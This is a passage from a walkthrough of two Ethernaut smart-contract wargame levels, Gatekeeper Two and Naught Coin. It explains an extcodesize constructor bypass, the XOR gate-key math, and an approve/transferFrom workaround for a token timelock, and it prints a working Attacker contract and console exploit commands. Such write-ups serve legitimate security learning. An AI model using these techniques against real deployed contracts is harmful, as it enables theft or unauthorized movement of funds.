This level is similar to Gatekeeper One. We must become the contract `entrant` by surpassing the three gate modifiers in the `enter()` function.

Again, we'll go through the gates one by one:
- `gateOne()`:
```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```
`gateOne()` is the exact same mechanism as in Gatekeeper One: it is just checking whether `msg.sender` is different from `tx.origin`. To surpass this gate, we'll just need to call the `enter()` function from a contract crafted by ourselves, rather than directly from our EOA.

- `gateTwo()`:
```solidity
modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```
The second gate adds a little bit of yul, a programming language used as an intermediate language in the compilation of smart contracts written in  Solidity. If you want to learn more about Yul, I recommend [this Udemy course](https://www.udemy.com/course/advanced-solidity-yul-and-assembly/) from [Jeffrey Scholz](https://twitter.com/Jeyffre).
In this case, the assembly block of code is pretty straightforward and also commented in the level tips: `extcodesize` will just return the code size of the caller. The code size must be 0 in order to surpass the gate. Usually,  `extcodesize` will return 0 if the caller is an EOA. If the caller is a contract, the code size will be greater than 0, so `extcodesize` will return a number higher than 0. This is a problem for us: the first gate forces the caller to be a Smart Contract and not an EOA, but in the second gate we want `extcodesize` to return 0 (we said that usually `extcodesize` will return a number > 0 ifthe caller is a smart contract). How can we approach this?
There's a specific case where `extcodesize` will return a number equal to 0 even if the caller is a contract. As we can see in [this great article by Consensys](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/), **a contract does not have source code available during construction**. This means that while the constructor is running, it can make calls to other contracts and `extcodesize` will return 0. This is exactly what we need! Now we know that in order to be able to surpass the second gate we should call `enter()` from our malicious contract's constructor.

- `gateThree()`:
```solidity
 modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }
```
  The third gate is similar to Gatekeeper One's third gate. There most important clue in this third gate is the XOR bitwise (`^`) operator. How does an XOR work? When comparing two inputs `a` and `b`, an XOR output will be 1 if the two bits we compare from the inputs are different, or 0 otherwise. Imagine `a` = 10110101 and `b` = 01010110. The XOR output for each bit will be:
  ```solidity
                                  a->   10110101
                                  b->   01010110
                                        --------
                                  c->   11100011
  ```
  XOR's have four properties:
  - Commutative: a ^ b = b ^ a
  - Associative: a ^(b ^ c) = (a ^ b) ^ c
  - Identity element: a ^ 0 = a
  - Self inverse: a ^ a = 0
  Let's say our `a` value is `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`, while our `c` value is `type(uint64).max`, while `uint64(_gateKey)`, which is `b`, remains unknown and we want to find it out. We can demonstrate that if `a` ^ `b` = `c`, then `a` ^ `c` = `b` applying boolean algebra and some of the XOR properties we just learnt above:
  ```solidity
  a ^ b = c
  a ^ (a ^ b) = a ^ c
  (a ^ a) ^ b = a ^ c
  0 ^ b = a ^ c
  b = a ^ c
  ```
  So we know that `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` ^ `type(uint64).max` = `uint64(_gateKey)`. We can just add this in our malicious contract in order to find out the gate key, considering that `msg.sender` will be our contract's address (because it will be the account executing the transaction). Our malicious contract finally looks something like this: 

  
  ``` solidity
  // SPDX-License-Identifier: MIT
  pragma solidity 0.8.17;
  interface IGatekeeperTwo {
      function enter(bytes8 _gateKey) external returns (bool);
  }

  contract Attacker {
      IGatekeeperTwo gatekeeperTwo;

      constructor(address _gatekeeperTwo) {
          bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        IGatekeeperTwo(_gatekeeperTwo).enter(gateKey);
      }
  
  } 
  ``` 

15th Ethernaut level completed ✅
## 16. Naught Coin 🪙🪙🪙
> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
>
> Things that might help
> - The ERC20 Spec
> - The OpenZeppelin codebase

This level shows the NaughCoin token, a token which mints all of its supply to the player (ourselves) on the token constructor, and which also has a timelock period of 10 years. This means that the player won't be able to transfer their tokens until 10 years have passed. Our goal for this level is to get rid of these tokens before the timelock period reaches an end. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

Notice that this token inherits from OpenZeppelin's ERC20 implementation. This allows the NaughtCoin token to be able to call any ERC20 function, even if it's not shown directly in this contract. As we can see in the contract code, the `transfer()` function overrides the ERC20 `transfer()` method, adding the `lockTokens()` modifier which makes sure to only allow the player to transfer their funds if the timelock period has passed. So we, as the player, we won't be able to directly use this function to get rid of the tokens. But because we inherit from ERC20, we have access to a lot more functions.

It is important to be aware of the fact that tokens permit to create allowances, where the owner of an amount of tokens allows another user to transfer the owner's funds on their behalf using the `transferFrom` function from the ERC20 standard. This function requires an approved allowance in order to be triggered. We can use the `approve()` function, also from the ERC20 standard, in order to approve a certain amount of tokens (in our case the initial supply from the token contract, which is `1000000 * (10**uint256(decimals())`) to be transferred by ourselves. This way, we will be able to trigger the `transferFrom` function  (if we didn't approve ourselves as operators we would have got an `insufficient allowance` error), and directly transfer the funds to another account different than ours. We can easily do it in Ethernaut's console likeso:

```javascript
// First approve ourselves as operators (note that this is being executed from the same 0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 account)
await contract.approve("0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1", "1000000000000000000000000");
// Once we have allowance, transfer all balance to another random account
await contract.transferFrom("0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1", "0x1a470e9916f3dFF8E268A69A39fa2E9F7B954927", "1000000000000000000000000");
```
16th Ethernaut level completed ✅

